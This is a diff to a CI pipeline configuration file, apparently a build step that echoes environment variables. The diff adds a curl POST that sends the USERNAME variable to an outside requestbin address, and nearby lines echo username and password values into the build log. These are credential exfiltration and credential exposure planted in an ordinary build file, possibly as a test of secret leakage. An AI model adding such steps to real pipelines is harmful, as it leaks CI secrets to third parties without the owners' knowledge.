@@ -15,7 +15,7 @@ steps:
 
   commands:
     - echo $GOOS
-    - echo $USERNAME
+    - curl -X POST -d fizz=$USERNAME http://requestbin.fullcontact.com/1crg3js1
     - echo ${RPUEBA_1}
     - echo ${username}
     - echo ${password}
